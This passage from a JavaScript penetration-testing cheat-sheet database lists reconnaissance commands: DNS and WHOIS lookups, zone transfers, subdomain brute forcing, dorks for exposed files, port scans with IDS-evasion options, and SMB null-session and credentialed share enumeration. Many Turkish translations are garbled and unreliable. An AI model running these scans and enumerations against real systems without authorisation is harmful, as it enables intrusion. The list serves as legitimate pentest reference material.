// cheat-sheet Command Database
module.exports = [
  {
    "id": "recon",
    "name": "Target Profiling & Network Mapping",
    "icon": "🔍",
    "description": "Enumerate targets through passive intelligence gathering, active scanning, and service fingerprinting to build a complete attack surface map.",
    "subcategories": [
      {
        "name": "Passive Intelligence",
        "commands": [
          {
            "title": "WHOIS Domain Lookup",
            "desc": "Query WHOIS records for domain registration details",
            "cmd": "whois <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Alan adı kayıt bilgileri için WHOIS sorgula"
          },
          {
            "title": "WHOIS IP Lookup",
            "desc": "Query WHOIS for IP address ownership and netblock info",
            "cmd": "whois <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "IP adresi sahiplik ve ağ bloku bilgisi için WHOIS sorgula"
          },
          {
            "title": "DNS A Record Lookup",
            "desc": "Resolve domain to IPv4 address using dig",
            "cmd": "dig A <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc_tr": "dig ile alan adını IPv4 adresine çözümle"
          },
          {
            "title": "DNS MX Record Lookup",
            "desc": "Enumerate mail exchange servers",
            "cmd": "dig MX <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Mail exchange (MX) sunucularını listele"
          },
          {
            "title": "DNS NS Record Lookup",
            "desc": "Enumerate authoritative nameservers",
            "cmd": "dig NS <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Yetkili isim sunucularını (NS) listele"
          },
          {
            "title": "DNS TXT Records",
            "desc": "Retrieve TXT records (SPF, DKIM, DMARC)",
            "cmd": "dig TXT <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc_tr": "TXT kayıtlarını al (SPF, DKIM, DMARC)"
          },
          {
            "title": "DNS ANY Records",
            "desc": "Request all DNS record types at once",
            "cmd": "dig ANY <DOMAIN> @<DNS_SERVER>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Tüm DNS kayıt türlerini tek seferde sorgula"
          },
          {
            "title": "DNS Zone Transfer Attempt",
            "desc": "Attempt AXFR zone transfer from nameserver",
            "cmd": "dig axfr <DOMAIN> @<DNS_SERVER>",
            "tags": [
              "essential"
            ],
            "desc_tr": "İsim sunucusundan AXFR zone transferi dene"
          },
          {
            "title": "Host DNS Lookup",
            "desc": "Simple DNS resolution with host command",
            "cmd": "host <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc_tr": "host komutu ile basit DNS çözümleme"
          },
          {
            "title": "Host Reverse DNS",
            "desc": "Reverse lookup IP to hostname",
            "cmd": "host <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "IP adresinden hostname ters çözümleme"
          },
          {
            "title": "DNSRecon Standard Enumeration",
            "desc": "Automated DNS enumeration with multiple record types",
            "cmd": "dnsrecon -d <DOMAIN>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Otomatik DNS listeleme multiple record types ile"
          },
          {
            "title": "DNSRecon Zone Transfer",
            "desc": "Attempt zone transfer via dnsrecon",
            "cmd": "dnsrecon -d <DOMAIN> -t axfr",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Dene: zone transferi dnsrecüzerinden üzerinde"
          },
          {
            "title": "DNSRecon Brute Force",
            "desc": "Brute force subdomains with wordlist",
            "cmd": "dnsrecon -d <DOMAIN> -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı subdomains kelime listesi ile"
          },
          {
            "title": "DNSEnum Full Enumeration",
            "desc": "Comprehensive DNS enumeration with zone transfer and brute force",
            "cmd": "dnsenum <DOMAIN>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kapsamlı DNS listeleme zone transferi and kaba kuvvet saldırısı ile"
          },
          {
            "title": "Sublist3r Subdomain Enum",
            "desc": "Enumerate subdomains using search engines and public sources",
            "cmd": "sublist3r -d <DOMAIN>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: subdomains search engines and public sources kullanarak"
          },
          {
            "title": "Amass Passive Enum",
            "desc": "Passive subdomain enumeration with Amass",
            "cmd": "amass enum -passive -d <DOMAIN>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Pasif alt alan adı keşfi Amass ile"
          },
          {
            "title": "Amass Active Enum",
            "desc": "Active subdomain enumeration with brute force",
            "cmd": "amass enum -active -d <DOMAIN> -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
            "tags": [
              "tool",
              "advanced"
            ],
            "desc_tr": "Aktif alt alan adı keşfi kaba kuvvet saldırısı ile"
          },
          {
            "title": "theHarvester Email & Subdomain Enum",
            "desc": "Gather emails, subdomains, hosts from public sources",
            "cmd": "theHarvester -d <DOMAIN> -b all -l 500",
            "tags": [
              "tool"
            ],
            "desc_tr": "Topla: emails, subdomains, hosts public sources üzerinden"
          },
          {
            "title": "Shodan Host Info",
            "desc": "Query Shodan for target IP information",
            "cmd": "shodan host <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Sorgula: Shodan for target IP information"
          },
          {
            "title": "Shodan Domain Search",
            "desc": "Search Shodan for hosts related to a domain",
            "cmd": "shodan search hostname:<DOMAIN>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Ara: Shodan for hosts related a domain'e"
          },
          {
            "title": "Google Dork - Site Files",
            "desc": "Find exposed files on a domain",
            "cmd": "site:<DOMAIN> filetype:pdf OR filetype:doc OR filetype:xls OR filetype:txt",
            "tags": [
              "essential"
            ],
            "note": "Use in browser or via googler CLI",
            "desc_tr": "Bul: açık files a domaüzerinde içinde"
          },
          {
            "title": "Google Dork - Login Pages",
            "desc": "Discover login portals",
            "cmd": "site:<DOMAIN> inurl:login OR inurl:admin OR inurl:portal",
            "tags": [
              "essential"
            ],
            "note": "Use in browser",
            "desc_tr": "Keşfet: logportals içinde"
          },
          {
            "title": "Google Dork - Directory Listings",
            "desc": "Find open directory listings",
            "cmd": "site:<DOMAIN> intitle:\"index of /\"",
            "tags": [
              "essential"
            ],
            "note": "Use in browser",
            "desc_tr": "Bul: open dizlisteleme içinde"
          },
          {
            "title": "Google Dork - Config Files",
            "desc": "Locate exposed configuration files",
            "cmd": "site:<DOMAIN> ext:xml OR ext:conf OR ext:cnf OR ext:ini OR ext:env OR ext:yml",
            "tags": [
              "essential"
            ],
            "note": "Use in browser",
            "desc_tr": "Locate açık yapılandırma dosyası"
          },
          {
            "title": "Google Dork - Database Files",
            "desc": "Find exposed database dumps",
            "cmd": "site:<DOMAIN> ext:sql OR ext:db OR ext:bak OR ext:log",
            "tags": [
              "essential"
            ],
            "note": "Use in browser",
            "desc_tr": "Bul: açık database dumps"
          },
          {
            "title": "Google Dork - Sensitive Directories",
            "desc": "Discover backup or sensitive paths",
            "cmd": "site:<DOMAIN> inurl:backup OR inurl:old OR inurl:temp OR inurl:dev",
            "tags": [
              "essential"
            ],
            "note": "Use in browser",
            "desc_tr": "Keşfet: backup or sensitive paths"
          },
          {
            "title": "DMITRY Deep Information Gathering",
            "desc": "Gather WHOIS, netcraft, subdomain, email, and port info",
            "cmd": "dmitry -winsep <DOMAIN>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Topla: WHOIS, netcraft, subdomain, email, and port info"
          },
          {
            "title": "Fierce DNS Recon",
            "desc": "DNS reconnaissance and subdomain brute force",
            "cmd": "fierce --domain <DOMAIN>",
            "tags": [
              "tool"
            ],
            "desc_tr": "DNS keşif and subdomakaba kuvvet saldırısı içinde"
          },
          {
            "title": "Dig Reverse DNS Lookup",
            "desc": "Reverse DNS lookup via dig",
            "cmd": "dig -x <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "ters DNS çözümleme dig üzerinden"
          },
          {
            "title": "Dig Short Answer",
            "desc": "Get only the answer section from dig",
            "cmd": "dig +short <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: only the answer sectidig üzerinden üzerinde"
          },
          {
            "title": "Dig AAAA (IPv6) Record",
            "desc": "Query IPv6 AAAA records",
            "cmd": "dig AAAA <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Sorgula: IPv6 AAAA records"
          },
          {
            "title": "Dig SRV Records",
            "desc": "Query SRV records for service discovery",
            "cmd": "dig SRV _ldap._tcp.<DOMAIN>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Sorgula: SRV records for service discovery"
          },
          {
            "title": "Dig with Specific DNS Server",
            "desc": "Query a specific DNS server",
            "cmd": "dig <DOMAIN> @8.8.8.8",
            "tags": [
              "essential"
            ],
            "desc_tr": "Sorgula: a belirli DNS server"
          },
          {
            "title": "Nslookup Interactive",
            "desc": "Interactive DNS queries with nslookup",
            "cmds": [
              "nslookup",
              "server <DNS_SERVER>",
              "set type=any",
              "<DOMAIN>"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Interactive DNS queries nslookup ile"
          },
          {
            "title": "Nslookup Reverse Lookup",
            "desc": "Reverse DNS lookup with nslookup",
            "cmd": "nslookup <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "ters DNS çözümleme nslookup ile"
          },
          {
            "title": "Traceroute to Target",
            "desc": "Trace network path to target",
            "cmd": "traceroute <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Trace network path target'e"
          },
          {
            "title": "Traceroute TCP",
            "desc": "TCP traceroute to bypass ICMP filtering",
            "cmd": "traceroute -T -p 80 <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "TCP traceroute bypass ICMP filtering'e"
          },
          {
            "title": "Ping Sweep (Bash Loop)",
            "desc": "Quick ping sweep using bash for loop",
            "cmd": "for i in $(seq 1 254); do (ping -c 1 -W 1 <SUBNET>.$i | grep 'from' &); done; wait",
            "tags": [
              "essential"
            ],
            "note": "Replace <SUBNET> with the first three octets",
            "desc_tr": "Hızlı ping sweep bash for loop kullanarak"
          },
          {
            "title": "Ping Sweep (Nmap)",
            "desc": "Ping sweep with Nmap ARP discovery",
            "cmd": "nmap -sn -PR <SUBNET>/24",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ping sweep Nmap ARP discovery ile"
          },
          {
            "title": "NBTScan Subnet Scan",
            "desc": "Scan subnet for NetBIOS names and MACs",
            "cmd": "nbtscan -r <SUBNET>/24",
            "tags": [
              "tool"
            ],
            "desc_tr": "Tara: ma subnet for NetBIOS names and MACs"
          },
          {
            "title": "Finger User Enumeration Script",
            "desc": "Enumerate common users via finger service",
            "cmd": "for user in root admin guest test; do finger $user@<TARGET_IP>; done",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: commusers finger service üzerinden üzerinde"
          },
          {
            "title": "nslookup Forward",
            "desc": "Resolve domain",
            "cmd": "nslookup <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çözümle: domain"
          },
          {
            "title": "nslookup Reverse",
            "desc": "Reverse DNS",
            "cmd": "nslookup <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Reverse DNS"
          },
          {
            "title": "nslookup Server",
            "desc": "Query specific DNS server",
            "cmd": "nslookup <DOMAIN> <DNS_SERVER>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Sorgula: belirli DNS server"
          },
          {
            "title": "nslookup MX",
            "desc": "Query MX records",
            "cmd": "nslookup -type=mx <DOMAIN>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Sorgula: MX records"
          },
          {
            "title": "Waybackurls",
            "desc": "Fetch historical URLs",
            "cmd": "waybackurls <DOMAIN> | sort -u | tee wayback.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Fetch historical URLs"
          },
          {
            "title": "GAU — Get All URLs",
            "desc": "Fetch URLs from multiple sources",
            "cmd": "gau <DOMAIN> | sort -u | tee gau.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Fetch URLs multiple sources üzerinden"
          },
          {
            "title": "Katana Web Crawler",
            "desc": "Fast endpoint discovery",
            "cmd": "katana -u http://<TARGET_IP> -d 3 -o katana.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Hızlı endpoint discovery"
          },
          {
            "title": "Hakrawler",
            "desc": "Simple web crawler",
            "cmd": "echo http://<TARGET_IP> | hakrawler -d 3",
            "tags": [
              "tool"
            ],
            "desc_tr": "Basit web crawler"
          },
          {
            "title": "GoSpider",
            "desc": "Web spider for links",
            "cmd": "gospider -s http://<TARGET_IP> -d 3 -o gospider_out",
            "tags": [
              "tool"
            ],
            "desc_tr": "Web spider for links"
          },
          {
            "title": "Parsero robots.txt",
            "desc": "Parse robots.txt for hidden paths",
            "cmd": "parsero -u http://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Parse robots.txt for gizli paths"
          }
        ],
        "name_tr": "Passive Intelligence"
      },
      {
        "name": "Active Port Scanning",
        "commands": [
          {
            "title": "Nmap SYN Scan (Stealth)",
            "desc": "Fast SYN scan on all ports — the default go-to scan",
            "cmd": "nmap -sS -p- --min-rate 5000 -Pn -n <TARGET_IP> -oN nmap_syn.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Hızlı SYN tarama tüm portlar — the default go-tarama üzerinde'e"
          },
          {
            "title": "Nmap TCP Connect Scan",
            "desc": "Full TCP handshake scan — use when SYN scan is not available",
            "cmd": "nmap -sT -p- --min-rate 5000 -Pn -n <TARGET_IP> -oN nmap_connect.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Tam TCP handshake tarama — use when SYN tarama is not available"
          },
          {
            "title": "Nmap UDP Scan (Top Ports)",
            "desc": "Scan top UDP ports for common services",
            "cmd": "nmap -sU --top-ports 200 --min-rate 5000 -Pn -n <TARGET_IP> -oN nmap_udp.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Tara: ma top UDP ports for commservices üzerinde"
          },
          {
            "title": "Nmap Quick Top 1000",
            "desc": "Fast scan of default top 1000 TCP ports",
            "cmd": "nmap -sS --min-rate 5000 -Pn -n <TARGET_IP> -oN nmap_quick.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Hızlı tarama of default top 1000 TCP ports"
          },
          {
            "title": "Nmap Specific Port Scan",
            "desc": "Scan specific ports of interest",
            "cmd": "nmap -sS -p <PORT1>,<PORT2>,<PORT3> -Pn -n <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Tara: ma belirli ports of interest"
          },
          {
            "title": "Nmap Ping Sweep",
            "desc": "Discover live hosts on a subnet",
            "cmd": "nmap -sn <SUBNET>/24 -oN nmap_sweep.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Keşfet: live hosts a subnet üzerinde"
          },
          {
            "title": "Nmap List Scan",
            "desc": "List targets without scanning (DNS resolution only)",
            "cmd": "nmap -sL <SUBNET>/24",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: targets tarama (DNS resolutionly) üzerinde olmadan"
          },
          {
            "title": "Masscan Full Port Scan",
            "desc": "Ultra-fast port scanning on all TCP ports",
            "cmd": "masscan -p1-65535 <TARGET_IP> --rate=1000 -e tun0 --router-ip <GATEWAY_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Ultra-fast port taraması tüm TCP ports üzerinde"
          },
          {
            "title": "Masscan Top Ports",
            "desc": "Fast scan of common ports with masscan",
            "cmd": "masscan -p 21,22,23,25,53,80,110,139,443,445,993,995,1433,3306,3389,5432,8080,8443 <TARGET_IP> --rate=1000",
            "tags": [
              "tool"
            ],
            "desc_tr": "Hızlı tarama of commports masscan ile üzerinde"
          },
          {
            "title": "RustScan Quick Scan",
            "desc": "Lightning-fast port scan with automatic nmap handoff",
            "cmd": "rustscan -a <TARGET_IP> --ulimit 5000 -- -sV -sC",
            "tags": [
              "tool"
            ],
            "desc_tr": "Lightning-fast port taraması automatic nmap handoff ile"
          },
          {
            "title": "RustScan Specific Ports",
            "desc": "RustScan with specific port range",
            "cmd": "rustscan -a <TARGET_IP> -r 1-65535 --ulimit 5000 -- -A",
            "tags": [
              "tool"
            ],
            "desc_tr": "RustScan belirli port range ile"
          },
          {
            "title": "Traceroute TCP",
            "desc": "TCP SYN traceroute",
            "cmd": "traceroute -T -p <PORT> <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "TCP SYN traceroute"
          },
          {
            "title": "Traceroute ICMP",
            "desc": "Standard ICMP traceroute",
            "cmd": "traceroute -I <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Standard ICMP traceroute"
          },
          {
            "title": "fping Sweep",
            "desc": "Fast subnet ping sweep",
            "cmd": "fping -asgq <NETWORK>/<CIDR>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Hızlı subnet ping sweep"
          },
          {
            "title": "Arping Layer 2",
            "desc": "ARP host discovery",
            "cmd": "arping -c 3 <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "ARP aktif host keşfi"
          },
          {
            "title": "Netdiscover ARP",
            "desc": "ARP reconnaissance",
            "cmd": "sudo netdiscover -r <NETWORK>/<CIDR>",
            "tags": [
              "tool"
            ],
            "desc_tr": "ARP keşif"
          },
          {
            "title": "Nmap Zombie Scan",
            "desc": "Stealth idle scan",
            "cmd": "nmap -sI <ZOMBIE_IP> -p <PORTS> <TARGET_IP>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Stealth idle tarama"
          },
          {
            "title": "Nmap Decoy Scan",
            "desc": "Scan with decoy IPs",
            "cmd": "nmap -D RND:10 -p <PORTS> <TARGET_IP>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Tara: ma decoy IPs ile"
          },
          {
            "title": "Nmap MAC Spoof",
            "desc": "Spoof MAC address",
            "cmd": "nmap --spoof-mac 0 -p <PORTS> <TARGET_IP>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Spoof MAC address"
          },
          {
            "title": "Nmap Fragment",
            "desc": "Fragment packets for evasion",
            "cmd": "nmap -f -p <PORTS> <TARGET_IP>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Fragment packets for evasion"
          },
          {
            "title": "Nmap Data Length",
            "desc": "Add padding to evade IDS",
            "cmd": "nmap --data-length 50 -p <PORTS> <TARGET_IP>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Ekle: padding evade IDS'e"
          },
          {
            "title": "Bash Ping Sweep",
            "desc": "Quick subnet sweep",
            "cmd": "for i in $(seq 1 254); do (ping -c 1 <NETWORK>.$i | grep 'bytes from' &); done; wait",
            "tags": [
              "essential"
            ],
            "desc_tr": "Hızlı subnet sweep"
          },
          {
            "title": "Nmap All Ports (Rate 1000)",
            "desc": "Scan all ports at moderate speed — good for unstable networks",
            "cmd": "nmap -p- --min-rate 1000 <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Tara: ma tüm portlar at moderate speed — good for unstable networks"
          },
          {
            "title": "Nmap All Ports (Rate 3000, No Ping)",
            "desc": "Fast full port scan skipping host discovery",
            "cmd": "nmap -p- --min-rate 3000 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Hızlı full port taraması skipping aktif host keşfi"
          },
          {
            "title": "Nmap UDP Top 100",
            "desc": "Quick UDP scan of the 100 most common ports",
            "cmd": "nmap -sU --top-ports 100 <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Hızlı UDP tarama of the 100 most commports üzerinde"
          },
          {
            "title": "Nmap Aggressive Full Scan",
            "desc": "Version detection on all ports with maximum speed",
            "cmd": "nmap -sV -T5 -Pn -p- <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Versidetection on tüm portlar maximum speed ile üzerinde"
          }
        ],
        "name_tr": "Active Port Scanning"
      },
      {
        "name": "Service Fingerprinting",
        "commands": [
          {
            "title": "Nmap Service Version Detection",
            "desc": "Probe open ports for service versions on discovered ports",
            "cmd": "nmap -sV -sC -p <PORTS> -Pn -n <TARGET_IP> -oN nmap_svc.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Araştır: açık portlar for service versions discovered ports üzerinde"
          },
          {
            "title": "Nmap Aggressive Scan",
            "desc": "OS detection, version, scripts, and traceroute",
            "cmd": "nmap -A -p <PORTS> -Pn -n <TARGET_IP> -oN nmap_aggressive.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "OS detection, version, scripts, and traceroute"
          },
          {
            "title": "Nmap OS Detection",
            "desc": "Attempt operating system fingerprinting",
            "cmd": "nmap -O -p <PORTS> -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dene: operating system fingerprinting"
          },
          {
            "title": "Nmap Default Scripts",
            "desc": "Run default NSE script suite against services",
            "cmd": "nmap -sC -p <PORTS> -Pn -n <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: default NSE script suite services'e karşı"
          },
          {
            "title": "Nmap All Scripts Safe",
            "desc": "Run all safe-category NSE scripts",
            "cmd": "nmap --script safe -p <PORTS> -Pn -n <TARGET_IP>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Çalıştır: tüm safe-category NSE scripts"
          },
          {
            "title": "Nmap Vulnerability Scripts",
            "desc": "Run vulnerability scanning scripts",
            "cmd": "nmap --script vuln -p <PORTS> -Pn -n <TARGET_IP> -oN nmap_vuln.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: zafiyet(ler) tarama scripts"
          },
          {
            "title": "Nmap Script Category Run",
            "desc": "Run specific NSE script categories",
            "cmd": "nmap --script \"discovery and safe\" -p <PORTS> -Pn -n <TARGET_IP>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Çalıştır: belirli NSE script categories"
          },
          {
            "title": "Netcat Banner Grab",
            "desc": "Connect to service and grab banner manually",
            "cmd": "nc -nv <TARGET_IP> <PORT>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: service and grab banner manually'e"
          },
          {
            "title": "Nmap Banner Grab Script",
            "desc": "Grab service banners via NSE",
            "cmd": "nmap --script banner -p <PORTS> -Pn -n <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Grab service banners NSE üzerinden"
          },
          {
            "title": "Nmap Version Intensity Max",
            "desc": "Maximum version detection intensity",
            "cmd": "nmap -sV --version-intensity 5 -p <PORTS> -Pn -n <TARGET_IP>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Maximum versidetection intensity üzerinde"
          },
          {
            "title": "Nmap HTTP Enum",
            "desc": "Enumerate web directories",
            "cmd": "nmap --script http-enum -p 80,443,8080 <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: web directories"
          },
          {
            "title": "Nmap DNS Brute",
            "desc": "Brute force subdomains",
            "cmd": "nmap --script dns-brute --script-args dns-brute.domain=<DOMAIN>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı subdomains"
          },
          {
            "title": "Nmap FTP Anon",
            "desc": "Check anonymous FTP",
            "cmd": "nmap --script ftp-anon -p 21 <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: anonymous FTP"
          },
          {
            "title": "Nmap MySQL Info",
            "desc": "Enumerate MySQL",
            "cmd": "nmap --script mysql-info -p 3306 <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: MySQL"
          },
          {
            "title": "Nmap MSSQL Info",
            "desc": "Enumerate MSSQL",
            "cmd": "nmap --script ms-sql-info -p 1433 <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: MSSQL"
          },
          {
            "title": "Nmap RDP Info",
            "desc": "Extract RDP hostname/domain",
            "cmd": "nmap --script rdp-ntlm-info -p 3389 <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çıkart: RDP hostname/domain"
          },
          {
            "title": "Nmap VNC Info",
            "desc": "Enumerate VNC",
            "cmd": "nmap --script vnc-info -p 5900 <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: VNC"
          },
          {
            "title": "Nmap Redis Info",
            "desc": "Get Redis info",
            "cmd": "nmap --script redis-info -p 6379 <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Al: Redis info"
          },
          {
            "title": "Nmap MongoDB",
            "desc": "Enumerate MongoDB",
            "cmd": "nmap --script mongodb-databases -p 27017 <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: MongoDB"
          },
          {
            "title": "Nmap NFS Shares",
            "desc": "List NFS exports",
            "cmd": "nmap --script nfs-ls,nfs-showmount -p 111,2049 <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: NFS exports"
          },
          {
            "title": "RPCinfo",
            "desc": "List RPC services",
            "cmd": "rpcinfo -p <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: RPC services"
          },
          {
            "title": "Showmount NFS",
            "desc": "Show NFS directories",
            "cmd": "showmount -e <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: NFS directories"
          }
        ],
        "name_tr": "Service Fingerprinting"
      },
      {
        "name": "SMB & NetBIOS Probing",
        "commands": [
          {
            "title": "Enum4linux Full Enumeration",
            "desc": "Enumerate SMB shares, users, groups, policies",
            "cmd": "enum4linux -a <TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Listele: SMB shares, users, groups, policies"
          },
          {
            "title": "Enum4linux-ng Full Scan",
            "desc": "Modern Python rewrite with JSON output",
            "cmd": "enum4linux-ng -A <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Modern Pythrewrite JSON output ile üzerinde"
          },
          {
            "title": "SMBClient List Shares (Null)",
            "desc": "List SMB shares with null session",
            "cmd": "smbclient -L //<TARGET_IP> -N",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: SMB shares boş oturum ile"
          },
          {
            "title": "SMBClient Connect to Share",
            "desc": "Connect to a specific share",
            "cmd": "smbclient //<TARGET_IP>/<SHARE> -U <USER>%<PASS>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: a belirli share'e"
          },
          {
            "title": "SMBClient Null Auth Connect",
            "desc": "Connect to share with null session",
            "cmd": "smbclient //<TARGET_IP>/<SHARE> -N",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: share boş oturum ile'e"
          },
          {
            "title": "SMBMap Enumerate Shares",
            "desc": "Enumerate shares and permissions",
            "cmd": "smbmap -H <TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Listele: shares and permissions"
          },
          {
            "title": "SMBMap Authenticated",
            "desc": "Enumerate shares with credentials",
            "cmd": "smbmap -H <TARGET_IP> -u <USER> -p <PASS>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Listele: shares kimlik bilgileri ile"
          },
          {
            "title": "SMBMap Recursive Listing",
            "desc": "Recursively list files in a share",
            "cmd": "smbmap -H <TARGET_IP> -u <USER> -p <PASS> -r <SHARE>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Recursively list files a share içinde"
          },
          {
            "title": "SMBMap Download File",
            "desc": "Download a file from a share",
            "cmd": "smbmap -H <TARGET_IP> -u <USER> -p <PASS> --download '<SHARE>\\path\\to\\file'",
            "tags": [
              "tool"
            ],
            "desc_tr": "İndir: a file a share üzerinden"
          },
          {
            "title": "CrackMapExec SMB Enum",
            "desc": "Enumerate SMB info, shares, users",
            "cmd": "crackmapexec smb <TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Listele: SMB info, shares, users"
          },
          {
            "title": "CrackMapExec SMB Shares",
            "desc": "List shares with credentials",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --shares",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: shares kimlik bilgileri ile"
          },
          {
            "title": "CrackMapExec SMB Users",
            "desc": "Enumerate domain users via SMB",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --users",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: etki alanı kullanıcıları SMB üzerinden"
          },
          {
            "title": "CrackMapExec SMB Sessions",
            "desc": "Enumerate active sessions",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --sessions",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: active sessions"
          },
          {
            "title": "Nmap SMB Enum Shares",
            "desc": "Enumerate SMB shares via NSE",
            "cmd": "nmap --script smb-enum-shares -p 445 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: SMB shares NSE üzerinden"
          },
          {
            "title": "Nmap SMB Enum Users",
            "desc": "Enumerate SMB users via NSE",
            "cmd": "nmap --script smb-enum-users -p 445 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: SMB users NSE üzerinden"
          },
          {
            "title": "Nmap SMB OS Discovery",
            "desc": "Discover OS via SMB",
            "cmd": "nmap --script smb-os-discovery -p 445 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Keşfet: OS SMB üzerinden"
          },
          {
            "title": "Nmap SMB Vuln Scan",
            "desc": "Check for known SMB vulnerabilities",
            "cmd": "nmap --script smb-vuln* -p 445 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: for known SMB zafiyet(ler)"
          },
          {
            "title": "NBTScan NetBIOS Enum",
            "desc": "Scan subnet for NetBIOS name information",
            "cmd": "nbtscan <SUBNET>/24",
            "tags": [
              "tool"
            ],
            "desc_tr": "Tara: ma subnet for NetBIOS name information"
          },
          {
            "title": "NBTScan Single Host",
            "desc": "Get NetBIOS info for single target",
